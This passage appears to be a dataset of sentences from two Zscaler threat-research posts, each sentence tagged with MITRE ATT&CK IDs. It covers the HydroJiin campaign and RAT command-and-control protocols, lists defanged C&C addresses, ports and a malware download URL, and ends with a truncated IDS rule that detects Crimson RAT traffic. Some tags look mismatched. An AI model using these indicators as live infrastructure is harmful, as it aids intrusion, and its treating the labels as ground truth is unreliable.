\"beltalus.ns1[.]name:8082;\"", "labels": ["TA0011", "TA0011"], "document": "zscaler_2021-04-14_look-hydrojiin-campaign"}, {"sentence": "The C&C address used to control the Python backdoor and socat reverse shell is historically known to host C&C servers for many other malwares.", "labels": ["TA0011", "TA0011", "TA0011", "T1059", "TA0011"], "document": "zscaler_2021-04-14_look-hydrojiin-campaign"}, {"sentence": "Here is list of some malware and corresponding ports used to host C&C servers in the past:", "labels": ["TA0011", "TA0011"], "document": "zscaler_2021-04-14_look-hydrojiin-campaign"}, {"sentence": "| 193.218.118.190 | 8266 | Python backdoor |", "labels": ["T1059"], "document": "zscaler_2021-04-14_look-hydrojiin-campaign"}, {"sentence": "| 193.218.118.190 | 4442 | Socat listener OPENSSL |", "labels": [], "document": "zscaler_2021-04-14_look-hydrojiin-campaign"}, {"sentence": "| 193.218.118.190 | 2407 | QuasarRAT |", "labels": ["S0262"], "document": "zscaler_2021-04-14_look-hydrojiin-campaign"}, {"sentence": "| 193.218.118.190 | 8050 | Nanocore |", "labels": ["S0336"], "document": "zscaler_2021-04-14_look-hydrojiin-campaign"}, {"sentence": "### Threat Actor HydroJiin", "labels": [], "document": "zscaler_2021-04-14_look-hydrojiin-campaign"}, {"sentence": "We believe this campaign is run by a threat actor known by the aliases \u2018Hydro\u2019 and \u2018JiiN\u2019.", "labels": [], "document": "zscaler_2021-04-14_look-hydrojiin-campaign"}, {"sentence": "By the other alias *JiiN*, the threat actor\u00a0runs a malware shop called *JiiN shop* at \u201c*xmr-services[.]com*\u201d.", "labels": [], "document": "zscaler_2021-04-14_look-hydrojiin-campaign"}, {"sentence": "Based on the two aliases, we are calling this campaign and actor *HydroJiin.*\u00a0", "labels": [], "document": "zscaler_2021-04-14_look-hydrojiin-campaign"}, {"sentence": "We are attributing this campaign to *HydroJiin* with high confidence due to following reasons:", "labels": [], "document": "zscaler_2021-04-14_look-hydrojiin-campaign"}, {"sentence": "* *JiiN shop(*Xmr-services) is used in this campaign.", "labels": [], "document": "zscaler_2021-04-14_look-hydrojiin-campaign"}, {"sentence": "* *JiiN shop(*Xmr-services) sells malware tools which Hydro makes videos about.", "labels": [], "document": "zscaler_2021-04-14_look-hydrojiin-campaign"}, {"sentence": "* This campaign downloads an encrypted payload from paste by user Hydro59.", "labels": ["T1105"], "document": "zscaler_2021-04-14_look-hydrojiin-campaign"}, {"sentence": "All of the above indicates the relation between HydroJiin, this campaign, and xmr-services.", "labels": [], "document": "zscaler_2021-04-14_look-hydrojiin-campaign"}, {"sentence": "The website called \u201cJiiN shop\u201d is based on the username of malware developer/seller and hosted at \u201c*xmr-services[.]com*.", "labels": [], "document": "zscaler_2021-04-14_look-hydrojiin-campaign"}, {"sentence": "***Figure 10:*** *JiiN Shop*", "labels": [], "document": "zscaler_2021-04-14_look-hydrojiin-campaign"}, {"sentence": "* **Minergate silent miner** - A configurable miner tool to mine multiple cryptocurrencies on CPU or GPU hidden from the user.", "labels": ["T1496", "T1496", "T1496"], "document": "zscaler_2021-04-14_look-hydrojiin-campaign"}, {"sentence": "Comes with a builder with options for obfuscation, persistence, etc.", "labels": ["TA0003", "T1027"], "document": "zscaler_2021-04-14_look-hydrojiin-campaign"}, {"sentence": "* **Coak Crypter -** As the name implies, a packer tool to obfuscate other malware to make them undetectable.", "labels": ["TA0005"], "document": "zscaler_2021-04-14_look-hydrojiin-campaign"}, {"sentence": "* **NiiJ Stealer -** A very basic stealer to steal passwords from popular tools like Firefox, Opera, Chrome, FileZilla, etc and send to the C&C panel.", "labels": ["TA0011", "T1606", "T1041"], "document": "zscaler_2021-04-14_look-hydrojiin-campaign"}, {"sentence": "* **INK Exploit -** Claims to make malware FUD, but provides no details about the specific exploit.", "labels": ["T1211"], "document": "zscaler_2021-04-14_look-hydrojiin-campaign"}, {"sentence": "And a non-exhaustive list of malicious websites serving malwares, C&C domains is also included in the IoC section.", "labels": ["TA0011", "T1566", "TA0011"], "document": "zscaler_2021-04-14_look-hydrojiin-campaign"}, {"sentence": "| atx111.exe | SmokeLoader |", "labels": ["S0226"], "document": "zscaler_2021-04-14_look-hydrojiin-campaign"}, {"sentence": "| lb777 | Lockbit ransomware |", "labels": ["T1486"], "document": "zscaler_2021-04-14_look-hydrojiin-campaign"}, {"sentence": "The threat actor HydroJiin has been in the malware business for some time now.", "labels": [], "document": "zscaler_2021-04-14_look-hydrojiin-campaign"}, {"sentence": "The malware payload download stats from pastebin indicate he is having decent success.", "labels": ["T1105"], "document": "zscaler_2021-04-14_look-hydrojiin-campaign"}, {"sentence": "SSL inspection is advisable to detect and block such threats using SSL to hide their malicious intent.", "labels": ["T1573"], "document": "zscaler_2021-04-14_look-hydrojiin-campaign"}, {"sentence": "| T1059 | Command and Scripting Interpreter: Windows Command Shell | Execute reverse shell commands |", "labels": ["T1059", "T1059"], "document": "zscaler_2021-04-14_look-hydrojiin-campaign"}, {"sentence": "| T1555 | Credentials from Password Stores | Mentioned RAT functionality\u00a0 |", "labels": ["T1555"], "document": "zscaler_2021-04-14_look-hydrojiin-campaign"}, {"sentence": "| T1573 | Encrypted Channel: Symmetric Cryptography | Encrypt the communication between the victim and the remote machine |", "labels": ["T1573", "T1573"], "document": "zscaler_2021-04-14_look-hydrojiin-campaign"}, {"sentence": "| T1105 | Ingress Tool Transfer\u00a0 | Downloads the Miner and RAT on the victim machine |", "labels": ["T1105", "T1105"], "document": "zscaler_2021-04-14_look-hydrojiin-campaign"}, {"sentence": "| T1056 | Input Capture: Keylogging | Mentioned RAT functionality\u00a0 |", "labels": ["T1056", "T1056"], "document": "zscaler_2021-04-14_look-hydrojiin-campaign"}, {"sentence": "| T1112 | Modify Registry | Modify Run entry in registry |", "labels": ["T1112", "T1112"], "document": "zscaler_2021-04-14_look-hydrojiin-campaign"}, {"sentence": "| T1090 | Proxy | Quasar uses SOCKS5 to communicate over a reverse proxy |", "labels": ["T1090", "S0262", "T1090"], "document": "zscaler_2021-04-14_look-hydrojiin-campaign"}, {"sentence": "| T1021 | Remote Services: Remote Desktop Protocol | Quasar module to perform remote desktop access |", "labels": ["T1090", "S0262", "T1090"], "document": "zscaler_2021-04-14_look-hydrojiin-campaign"}, {"sentence": "| T1053 | Scheduled Task/Job: Scheduled Task | Establish persistence by creating new schtasks |", "labels": ["T1053", "T1053"], "document": "zscaler_2021-04-14_look-hydrojiin-campaign"}, {"sentence": "| T1082 | System Information Discovery | Quasar and NETWIRE both RAT having this feature to discover and collect victim machine information.", "labels": ["T1082", "S0262", "T1082"], "document": "zscaler_2021-04-14_look-hydrojiin-campaign"}, {"sentence": "| T1125 | Video Capture | Mentioned RAT functionality\u00a0 |", "labels": ["T1125"], "document": "zscaler_2021-04-14_look-hydrojiin-campaign"}, {"sentence": "| T1113 | Screen Capture | Mentioned RAT functionality\u00a0 |", "labels": ["T1113"], "document": "zscaler_2021-04-14_look-hydrojiin-campaign"}, {"sentence": "| T1132 | Data Encoding | Downloaded Base64 encoded file |", "labels": ["T1132", "T1132"], "document": "zscaler_2021-04-14_look-hydrojiin-campaign"}, {"sentence": "| T1496 | Resource Hijacking | Install XMRig Miner on victim machine\u00a0 |", "labels": ["T1496", "T1496"], "document": "zscaler_2021-04-14_look-hydrojiin-campaign"}, {"sentence": "| T1027 | Obfuscated Files or Information | XOR operation is implemented to decrypt the file |", "labels": ["T1027", "T1027"], "document": "zscaler_2021-04-14_look-hydrojiin-campaign"}, {"sentence": "| r3clama[.]com/files/socat.zip | Socat tool |", "labels": [], "document": "zscaler_2021-04-14_look-hydrojiin-campaign"}, {"sentence": "| **C&C** | **Malware** |", "labels": ["TA0011", "TA0011"], "document": "zscaler_2021-04-14_look-hydrojiin-campaign"}, {"sentence": "| beltalus.ns1[.]name:8084' | NetWiredRC |", "labels": ["S0198"], "document": "zscaler_2021-04-14_look-hydrojiin-campaign"}, {"sentence": "| 82.65.58[.]129 | NetWiredRC |", "labels": ["S0198"], "document": "zscaler_2021-04-14_look-hydrojiin-campaign"}, {"sentence": "| beltalus.ns1[.]name:8082 | QuasarRAT |", "labels": ["S0262"], "document": "zscaler_2021-04-14_look-hydrojiin-campaign"}, {"sentence": "| 193.218.118[.]190:8266 | Pyrome backdoor |", "labels": ["TA0003"], "document": "zscaler_2021-04-14_look-hydrojiin-campaign"}, {"sentence": "| 193.218.118[.]190:4442 | Socat\u00a0 |", "labels": [], "document": "zscaler_2021-04-14_look-hydrojiin-campaign"}, {"sentence": "| 193.218.118[.]190:8266 | Python backdoor |", "labels": ["TA0003"], "document": "zscaler_2021-04-14_look-hydrojiin-campaign"}, {"sentence": "| 193.218.118[.]190:4442 | Socat listener OPENSSL |", "labels": [], "document": "zscaler_2021-04-14_look-hydrojiin-campaign"}, {"sentence": "| 193.218.118[.]190:1111 | NjRAT |", "labels": ["S0385"], "document": "zscaler_2021-04-14_look-hydrojiin-campaign"}, {"sentence": "| 193.218.118[.]190:2407 | QuasarRAT |", "labels": ["S0262"], "document": "zscaler_2021-04-14_look-hydrojiin-campaign"}, {"sentence": "Catching RATs Over Custom Protocols", "labels": ["T1437"], "document": "zscaler_2021-05-05_catching-rats-over-custom-protocols"}, {"sentence": "Adversaries generally use Standard Application Layer Protocols for communication between malware and command and control (C&C) servers.", "labels": ["TA0011", "TA0011", "T1071", "TA0011"], "document": "zscaler_2021-05-05_catching-rats-over-custom-protocols"}, {"sentence": "This is for several reasons: first, malicious traffic blends in more easily with legitimate traffic on standard protocols like HTTP/S; second, companies that rely on appliances for security often don\u2019t inspect all SSL/TLS encrypted traffic as it is extremely resource-intensive to do so.", "labels": ["TA0011", "T1071"], "document": "zscaler_2021-05-05_catching-rats-over-custom-protocols"}, {"sentence": "However, the massive growth of SSL attacks \u2013\u00a0[260% higher in 2020 compared to 2019](/blogs/security-research/2020-state-encrypted-attacks)\u00a0\u2013 has turned many security teams\u2019 attention to these encrypted channels.", "labels": ["T1573", "T1573"], "document": "zscaler_2021-05-05_catching-rats-over-custom-protocols"}, {"sentence": "For those that do inspect their encrypted traffic, modern network security proxies, gateways, and firewalls are evolved enough to conveniently parse application protocols and strip the SSL layer to scan the underlying data.", "labels": ["T1573", "T1071"], "document": "zscaler_2021-05-05_catching-rats-over-custom-protocols"}, {"sentence": "These trends have led some adversaries to turn to custom protocols.", "labels": ["T1071"], "document": "zscaler_2021-05-05_catching-rats-over-custom-protocols"}, {"sentence": "Although custom protocols for malicious communication are nothing new,\u00a0almost one-third of prevalent malware families we recently analyzed support communication over non-HTTP/S protocols.", "labels": ["T1559", "TA0011"], "document": "zscaler_2021-05-05_catching-rats-over-custom-protocols"}, {"sentence": "Below are statistical representations of traffic that Zscaler blocked for non-HTTP/S\u00a0C&C communication, as well as the most active RAT families that we observed over a three-month period.", "labels": ["TA0011", "TA0011"], "document": "zscaler_2021-05-05_catching-rats-over-custom-protocols"}, {"sentence": "*Fig.1: Hits of top threats communicating over non-HTTP/Sin the last quarter.*", "labels": ["TA0011"], "document": "zscaler_2021-05-05_catching-rats-over-custom-protocols"}, {"sentence": "### **Remcos RAT**", "labels": ["S0332"], "document": "zscaler_2021-05-05_catching-rats-over-custom-protocols"}, {"sentence": "Remcos is\u00a0remote access and surveillance software developed and distributed by an organization called Breaking Security.", "labels": ["S0332"], "document": "zscaler_2021-05-05_catching-rats-over-custom-protocols"}, {"sentence": "The Remcos RAT appeared in hacking forums in late 2016.", "labels": ["S0332"], "document": "zscaler_2021-05-05_catching-rats-over-custom-protocols"}, {"sentence": "Since then, it has been favored by many cyber criminals and even adopted by APT actors such as the [Gorgon Group](https://attack.mitre.org/groups/G0078/) and [Elfin Group](https://attack.mitre.org/groups/G0064/).", "labels": ["G0078", "G0064"], "document": "zscaler_2021-05-05_catching-rats-over-custom-protocols"}, {"sentence": "Remcos is primarily delivered to victims via malicious attachments in phishing emails.", "labels": ["S0332", "T1566"], "document": "zscaler_2021-05-05_catching-rats-over-custom-protocols"}, {"sentence": "Its capabilities range from logging keystrokes to executing commands, stealing credentials, and capturing microphones and webcams.", "labels": ["TA0002", "T1056", "T1125"], "document": "zscaler_2021-05-05_catching-rats-over-custom-protocols"}, {"sentence": "RC4 key and encrypted configuration data is kept in the resource section \u201cSETTINGS\u201d under \u201cRCData\u201d.", "labels": ["T1027"], "document": "zscaler_2021-05-05_catching-rats-over-custom-protocols"}, {"sentence": "The configuration contains the C&C address, port, mutex name, and encryption key for C&C communication.", "labels": ["TA0011", "TA0011", "TA0011", "T1573"], "document": "zscaler_2021-05-05_catching-rats-over-custom-protocols"}, {"sentence": "*Fig.3: Encrypted configuration in resource.*", "labels": ["T1027"], "document": "zscaler_2021-05-05_catching-rats-over-custom-protocols"}, {"sentence": "*Fig.4: Decrypted configuration*", "labels": ["T1027"], "document": "zscaler_2021-05-05_catching-rats-over-custom-protocols"}, {"sentence": "Remcos communicates over non-HTTP/S\u00a0channels/ports on custom protocols.", "labels": ["S0332", "T1571"], "document": "zscaler_2021-05-05_catching-rats-over-custom-protocols"}, {"sentence": "The bot can be configured to communicate in plain text, which makes it fairly straightforward to detect\u00a0C&C traffic.", "labels": ["TA0011", "TA0011"], "document": "zscaler_2021-05-05_catching-rats-over-custom-protocols"}, {"sentence": "The custom protocol contains the header \u201c[DataStart]\u201d followed by the size of data and then followed by the exfiltrated data.", "labels": ["T1571", "T1041"], "document": "zscaler_2021-05-05_catching-rats-over-custom-protocols"}, {"sentence": "*Fig.5: Data sent to C&C server in plain text.*", "labels": ["TA0011", "T1041"], "document": "zscaler_2021-05-05_catching-rats-over-custom-protocols"}, {"sentence": "However, in most cases, the communication is encrypted using the RC4 algorithm with a key present in the configuration.", "labels": ["T1573"], "document": "zscaler_2021-05-05_catching-rats-over-custom-protocols"}, {"sentence": "It is not possible to match signatures in encrypted binary data.", "labels": ["T1573"], "document": "zscaler_2021-05-05_catching-rats-over-custom-protocols"}, {"sentence": "Upon execution, Remcos sends system information to its C&C server, and in return the server replies with commands to execute.", "labels": ["S0332", "TA0011", "T1041", "TA0011"], "document": "zscaler_2021-05-05_catching-rats-over-custom-protocols"}, {"sentence": "As this request and response is encrypted with the same symmetric key, the header \u201c[DataStart]\u201d will generate the same encrypted stream of bytes in place of the header for all communication generated by the executable.", "labels": ["T1573", "T1573"], "document": "zscaler_2021-05-05_catching-rats-over-custom-protocols"}, {"sentence": "*Fig.6: Data sent to C&C server as RC4 encrypted.*", "labels": ["TA0011", "T1573"], "document": "zscaler_2021-05-05_catching-rats-over-custom-protocols"}, {"sentence": "The repeated stream pattern of 11 bytes in requests and responses\u2014plus a combination of other heuristics such as entropy and data length limits\u2014can be considered for flagging RC4 encrypted Remcos traffic.", "labels": ["S0332", "T1573"], "document": "zscaler_2021-05-05_catching-rats-over-custom-protocols"}, {"sentence": "### **Crimson RAT**", "labels": ["S0115"], "document": "zscaler_2021-05-05_catching-rats-over-custom-protocols"}, {"sentence": "Crimson RAT has been favored by threat actors for targeted attacks on governments and organizations in the financial, healthcare, and space technology sectors.", "labels": ["S0115"], "document": "zscaler_2021-05-05_catching-rats-over-custom-protocols"}, {"sentence": "Crimson is typically delivered to the victim via a phishing email containing a malicious .doc file or link to a malicious executable.", "labels": ["S0115", "T1566"], "document": "zscaler_2021-05-05_catching-rats-over-custom-protocols"}, {"sentence": "*Fig.7: Data sent to C&C server*", "labels": ["TA0011", "T1041"], "document": "zscaler_2021-05-05_catching-rats-over-custom-protocols"}, {"sentence": "### **NetWire RAT**", "labels": ["S0198"], "document": "zscaler_2021-05-05_catching-rats-over-custom-protocols"}, {"sentence": "The NetWire RAT is a malicious tool that emerged almost a decade ago and has been updated many times since then.", "labels": ["S0198"], "document": "zscaler_2021-05-05_catching-rats-over-custom-protocols"}, {"sentence": "NetWire has been detected in various campaigns such as\u00a0[Hydrojiin](/blogs/security-research/look-hydrojiin-campaign) and advanced persistent threat (APT) attacks including\u00a0[SilverTerrier](https://attack.mitre.org/groups/G0083/) and [The White Company](https://attack.mitre.org/groups/G0089/).", "labels": ["S0198", "G0083", "G0089"], "document": "zscaler_2021-05-05_catching-rats-over-custom-protocols"}, {"sentence": "Typically, the NetWire RAT is downloaded as a second-stage payload to systems that have been compromised using other malware such as GuLoader.", "labels": ["S0198", "S0561", "T1105"], "document": "zscaler_2021-05-05_catching-rats-over-custom-protocols"}, {"sentence": "NetWire communicates with custom protocols over TCP and communication is encrypted with AES encryption.", "labels": ["S0198", "T1071", "T1573"], "document": "zscaler_2021-05-05_catching-rats-over-custom-protocols"}, {"sentence": "The C&C server generates a session key for this information.", "labels": ["TA0011", "TA0011"], "document": "zscaler_2021-05-05_catching-rats-over-custom-protocols"}, {"sentence": "*Fig.8: Data sent to C&C server as AES encrypted.*", "labels": ["TA0011", "T1573"], "document": "zscaler_2021-05-05_catching-rats-over-custom-protocols"}, {"sentence": "As the communication is AES encrypted, it is not possible to scan for signature patterns in communication.", "labels": ["T1573"], "document": "zscaler_2021-05-05_catching-rats-over-custom-protocols"}, {"sentence": "However, there is enough information in the initial packet to flag the traffic as NetWire C&C communication.", "labels": ["S0198", "TA0011", "TA0011"], "document": "zscaler_2021-05-05_catching-rats-over-custom-protocols"}, {"sentence": "### **AsyncRAT**", "labels": [], "document": "zscaler_2021-05-05_catching-rats-over-custom-protocols"}, {"sentence": "AsyncRAT is an open-source RAT designed to remotely monitor and control other computers through a secure encrypted connection.", "labels": ["T1573"], "document": "zscaler_2021-05-05_catching-rats-over-custom-protocols"}, {"sentence": "AsyncRAT provides functionality such as keylogger, screen viewer, command execution, and many more.", "labels": ["TA0002", "T1056", "T1113"], "document": "zscaler_2021-05-05_catching-rats-over-custom-protocols"}, {"sentence": "Because of its feature of secure communication, AsyncRAT is used for malicious motives by cybercriminals and weaponized in APT campaigns such as \"[Operation Spalax](https://www.welivesecurity.com/2021/01/12/operation-spalax-targeted-malware-attacks-colombia/).", "labels": [], "document": "zscaler_2021-05-05_catching-rats-over-custom-protocols"}, {"sentence": "AsyncRAT has been found to be delivered via various methods such as spear-phishing, malvertising, and exploit kits.", "labels": ["T1566", "T1566", "T1190"], "document": "zscaler_2021-05-05_catching-rats-over-custom-protocols"}, {"sentence": "AsyncRAT communicates over secure TCP channels.", "labels": ["T1573"], "document": "zscaler_2021-05-05_catching-rats-over-custom-protocols"}, {"sentence": "As the custom certificate is carried in the binary itself and matched against the C&C certificate, it is not possible to strip the TLS layer at the proxy/gateway level.", "labels": ["TA0011", "TA0011"], "document": "zscaler_2021-05-05_catching-rats-over-custom-protocols"}, {"sentence": "*Fig.9: Server certificate having subject and issuer name as \u201cAsyncRAT Server\u201d*", "labels": [], "document": "zscaler_2021-05-05_catching-rats-over-custom-protocols"}, {"sentence": "#### **Quasar RAT**", "labels": ["S0262"], "document": "zscaler_2021-05-05_catching-rats-over-custom-protocols"}, {"sentence": "Quasar is an open-source RAT that has been observed being used maliciously by cybercriminals and APT actors including \u201c[Gorgon Group](https://attack.mitre.org/groups/G0078/)\u201d and\u00a0\u201c[Patchwork](https://attack.mitre.org/groups/G0040/).", "labels": ["S0262", "G0078", "G0040"], "document": "zscaler_2021-05-05_catching-rats-over-custom-protocols"}, {"sentence": "Its features include\u00a0remote desktop, keylogging, password stealing, and many more.", "labels": ["T1056", "TA0006"], "document": "zscaler_2021-05-05_catching-rats-over-custom-protocols"}, {"sentence": "Quasar encrypts communications using an AES algorithm with a pre-shared key hardcoded in the client binary.", "labels": ["S0262", "T1573"], "document": "zscaler_2021-05-05_catching-rats-over-custom-protocols"}, {"sentence": "However, the distinctive characteristics of encrypted data packets can be leveraged to flag Quasar's AES encrypted traffic.", "labels": ["T1573"], "document": "zscaler_2021-05-05_catching-rats-over-custom-protocols"}, {"sentence": "*Fig.10: Data sent to C&C server as AES encrypted.*", "labels": ["TA0011", "T1573"], "document": "zscaler_2021-05-05_catching-rats-over-custom-protocols"}, {"sentence": "The distinctive first 4 bytes of the payload can be used to identify Quasar traffic.", "labels": ["S0262"], "document": "zscaler_2021-05-05_catching-rats-over-custom-protocols"}, {"sentence": "### **Agent Tesla RAT**", "labels": ["S0331"], "document": "zscaler_2021-05-05_catching-rats-over-custom-protocols"}, {"sentence": "The Agent Tesla RAT has been very active and prevalent.", "labels": ["S0331"], "document": "zscaler_2021-05-05_catching-rats-over-custom-protocols"}, {"sentence": "Over the last couple of years, there have been huge ongoing phishing campaigns delivering Agent Tesla RAT.", "labels": ["S0331", "T1566"], "document": "zscaler_2021-05-05_catching-rats-over-custom-protocols"}, {"sentence": "Agent Tesla has evolved over time, varying its behavior from campaign to campaign.", "labels": ["S0331"], "document": "zscaler_2021-05-05_catching-rats-over-custom-protocols"}, {"sentence": "Cybercriminals use this RAT to steal user credentials and spy on victims through screenshots, keyboard logging, and clipboard capturing.", "labels": ["TA0006", "T1113", "T1056", "T1115"], "document": "zscaler_2021-05-05_catching-rats-over-custom-protocols"}, {"sentence": "Credential stealing is supported across various software ranging from browsers to mail clients, VPNs, and wallets.", "labels": ["TA0006"], "document": "zscaler_2021-05-05_catching-rats-over-custom-protocols"}, {"sentence": "Agent Tesla communicates and exfiltrates data to its C&C server on HTTP, FTP, SMTP, and Telegram API.", "labels": ["S0331", "TA0011", "T1041", "T1071", "T1071", "T1071", "T1102"], "document": "zscaler_2021-05-05_catching-rats-over-custom-protocols"}, {"sentence": "All collected data is encapsulated into an HTML page, and that HTML page is sent to a C&C over one of the aforementioned protocols.", "labels": ["TA0011", "T1041"], "document": "zscaler_2021-05-05_catching-rats-over-custom-protocols"}, {"sentence": "For communication over FTP, the HTML page is sent as a file to an FTP C&C server.", "labels": ["TA0011", "T1071", "T1071"], "document": "zscaler_2021-05-05_catching-rats-over-custom-protocols"}, {"sentence": "*Fig.11: Data to be sent via FTP.*", "labels": ["T1071"], "document": "zscaler_2021-05-05_catching-rats-over-custom-protocols"}, {"sentence": "*Fig.12: Exfiltration over FTP*", "labels": ["T1071"], "document": "zscaler_2021-05-05_catching-rats-over-custom-protocols"}, {"sentence": "For communication over SMTP, the HTML page is sent as a mail body to the C&C server.", "labels": ["TA0011", "T1071", "T1071"], "document": "zscaler_2021-05-05_catching-rats-over-custom-protocols"}, {"sentence": "*Fig.13: Exfiltration over SMTP*", "labels": ["T1071"], "document": "zscaler_2021-05-05_catching-rats-over-custom-protocols"}, {"sentence": "### **CyberGate RAT**", "labels": [], "document": "zscaler_2021-05-05_catching-rats-over-custom-protocols"}, {"sentence": "CyberGate allows an attacker to browse and manipulate files, devices, and settings on the victim's machine as well as download and execute additional malware.", "labels": ["T1565", "T1082", "T1105"], "document": "zscaler_2021-05-05_catching-rats-over-custom-protocols"}, {"sentence": "It also has a wide range of information-stealing abilities including browser credential theft, keylogging, screen capture, and remote enabling of webcams.", "labels": ["T1555", "T1056", "T1113", "T1125"], "document": "zscaler_2021-05-05_catching-rats-over-custom-protocols"}, {"sentence": "The CyberGate RAT communicates on a custom protocol over TCP.", "labels": ["T1071"], "document": "zscaler_2021-05-05_catching-rats-over-custom-protocols"}, {"sentence": "CyberGate\u00a0collects the info as per the command received from the C&C server, compresses data by ZLib, encrypts it by RC4 with a hardcoded key, and then sends it to the C&C server.", "labels": ["TA0011", "TA0011", "T1041", "T1132", "T1573", "TA0011"], "document": "zscaler_2021-05-05_catching-rats-over-custom-protocols"}, {"sentence": "*Fig.14: Compressed and Encrypted data sent to C&C.*", "labels": ["TA0011", "T1573"], "document": "zscaler_2021-05-05_catching-rats-over-custom-protocols"}, {"sentence": "To flag the CyberGate RAT traffic, a combination of data length, marker, and delimiter can be considered.", "labels": ["TA0011"], "document": "zscaler_2021-05-05_catching-rats-over-custom-protocols"}, {"sentence": "### **NanoCore RAT**", "labels": ["S0336"], "document": "zscaler_2021-05-05_catching-rats-over-custom-protocols"}, {"sentence": "Though NanoCore RAT emerged almost a decade ago, it is still one of the most prevalent RAT families, and multiple versions have appeared since then.", "labels": ["S0336"], "document": "zscaler_2021-05-05_catching-rats-over-custom-protocols"}, {"sentence": "NanoCore RAT is modular malware which comes with plugin support to expand its functionality.", "labels": ["S0336"], "document": "zscaler_2021-05-05_catching-rats-over-custom-protocols"}, {"sentence": "Basic plugins feature remote surveillance via remote desktop, monitor webcam, capture audio, etc.", "labels": ["T1125", "T1123"], "document": "zscaler_2021-05-05_catching-rats-over-custom-protocols"}, {"sentence": "Additional plugins have been found to be used for cryptocurrency mining, ransomware attacks, credential stealing, and more.", "labels": ["T1486", "T1496", "TA0010"], "document": "zscaler_2021-05-05_catching-rats-over-custom-protocols"}, {"sentence": "NanoCore RAT has been found to be delivered via phishing emails containing .doc macros that load a NanoCore binary with fileless infection techniques.", "labels": ["S0336", "S0336", "T1566"], "document": "zscaler_2021-05-05_catching-rats-over-custom-protocols"}, {"sentence": "NanoCore communicates on a custom protocol over TCP and uses the DES algorithm with hardcoded key and IV value to encrypt the communication between bot and its C&C server.", "labels": ["S0336", "TA0011", "T1573", "T1573"], "document": "zscaler_2021-05-05_catching-rats-over-custom-protocols"}, {"sentence": "The communication packet begins with a 4-byte data length followed by DES-encrypted data of that length.", "labels": ["T1573"], "document": "zscaler_2021-05-05_catching-rats-over-custom-protocols"}, {"sentence": "Fig.15: Encrypted data C&C communication", "labels": ["TA0011", "T1573"], "document": "zscaler_2021-05-05_catching-rats-over-custom-protocols"}, {"sentence": "It is not possible to scan for patterns in DES-encrypted data.", "labels": ["T1573"], "document": "zscaler_2021-05-05_catching-rats-over-custom-protocols"}, {"sentence": "This results in some encrypted traffic that will be the same across all bots generated using the publicly available bot-builder.", "labels": ["T1573"], "document": "zscaler_2021-05-05_catching-rats-over-custom-protocols"}, {"sentence": "Fig.16: Fix length first response from C&C server.", "labels": ["TA0011", "TA0011"], "document": "zscaler_2021-05-05_catching-rats-over-custom-protocols"}, {"sentence": "### **Gh0st RAT**", "labels": ["S0032"], "document": "zscaler_2021-05-05_catching-rats-over-custom-protocols"}, {"sentence": "Gh0st is an open-source RAT that has been observed being used maliciously by cybercriminals and APT actors such as \u201c[TA459](https://attack.mitre.org/groups/G0062/)\u201d and\u00a0\u201c[APT18](https://attack.mitre.org/groups/G0026/).\".", "labels": ["S0032", "G0062", "G0026"], "document": "zscaler_2021-05-05_catching-rats-over-custom-protocols"}, {"sentence": "Its\u00a0features include remote desktop, logging keystrokes, stealing credentials, capturing microphone and webcam, and many more.", "labels": ["TA0006", "T1123", "T1021", "T1056", "T1125", "T1021", "T1123", "T1056", "TA0006", "T1125"], "document": "zscaler_2021-05-05_catching-rats-over-custom-protocols"}, {"sentence": "Gh0st communicates on a custom protocol over TCP.", "labels": ["S0032"], "document": "zscaler_2021-05-05_catching-rats-over-custom-protocols"}, {"sentence": "It uses a sequential byte-to-byte encryption algorithm to encrypt communication with the C&C server.", "labels": ["TA0011", "T1573"], "document": "zscaler_2021-05-05_catching-rats-over-custom-protocols"}, {"sentence": "Upon execution, it collects system data such as system information, version, processor description, installed antivirus, etc.", "labels": ["TA0007", "T1082", "T1082", "T1082", "T1518"], "document": "zscaler_2021-05-05_catching-rats-over-custom-protocols"}, {"sentence": "### **njRAT**", "labels": ["S0385"], "document": "zscaler_2021-05-05_catching-rats-over-custom-protocols"}, {"sentence": "Discovered almost a decade ago, njRAT, also known as Bladabindi, is the most active and prevalent remote access trojan.", "labels": ["S0385", "S0385"], "document": "zscaler_2021-05-05_catching-rats-over-custom-protocols"}, {"sentence": "It allows attackers to do surveillance and control the victim's computer.", "labels": ["TA0009"], "document": "zscaler_2021-05-05_catching-rats-over-custom-protocols"}, {"sentence": "njRAT is mostly found to be delivered via phishing email campaigns containing malicious Word document attachments.", "labels": ["S0385", "T1566"], "document": "zscaler_2021-05-05_catching-rats-over-custom-protocols"}, {"sentence": "It is also found to be delivered by masquerading as a legitimate application installer uploaded to file-sharing services and luring victims via drive-by download campaigns.", "labels": ["T1036", "T1189"], "document": "zscaler_2021-05-05_catching-rats-over-custom-protocols"}, {"sentence": "Since the leak of source code 2013, njRAT has become widely adopted by cybercriminals and APT actors including\u00a0[Gorgon Group](https://attack.mitre.org/groups/G0078/)\u00a0and\u00a0[APT41](https://attack.mitre.org/groups/G0096/).", "labels": ["S0385", "G0078", "G0096"], "document": "zscaler_2021-05-05_catching-rats-over-custom-protocols"}, {"sentence": "Some variants have been found to be communicating over standard HTTP protocol and others were found to be communicating over custom protocols over TCP.", "labels": ["T1071", "T1071"], "document": "zscaler_2021-05-05_catching-rats-over-custom-protocols"}, {"sentence": "The packet begins with data length in a decimal format null-terminated string followed by command and then delimiter followed by exfiltrated data.", "labels": ["TA0010"], "document": "zscaler_2021-05-05_catching-rats-over-custom-protocols"}, {"sentence": "*Fig.18: Fix length first response from C&C server.*", "labels": ["TA0011", "TA0011"], "document": "zscaler_2021-05-05_catching-rats-over-custom-protocols"}, {"sentence": "All of the above-discussed RATs are communicating on custom and encrypted protocols over TCP.", "labels": ["T1071"], "document": "zscaler_2021-05-05_catching-rats-over-custom-protocols"}, {"sentence": "When communication is encrypted, it is more difficult to scan for their signature patterns in network traffic.", "labels": ["T1573"], "document": "zscaler_2021-05-05_catching-rats-over-custom-protocols"}, {"sentence": "However, we have discussed alternative ways to flag RAT traffic based on the heuristics of encrypted data.", "labels": ["T1573"], "document": "zscaler_2021-05-05_catching-rats-over-custom-protocols"}, {"sentence": "Four properties that are common to most RAT traffic on non-HTTP/S\u00a0are:", "labels": ["TA0011"], "document": "zscaler_2021-05-05_catching-rats-over-custom-protocols"}, {"sentence": "3.The C&C server responds in the same packet format as the client.", "labels": ["TA0011", "TA0011"], "document": "zscaler_2021-05-05_catching-rats-over-custom-protocols"}, {"sentence": "*alert tcp $EXTERNAL\\_NET any -> $HOME\\_NET any (msg:\"Zscaler Win32.Backdoor.CrimsonRat - CNC command\"; flow:established,to\\_client; content:\"|00 00 00 00|\"; offset: 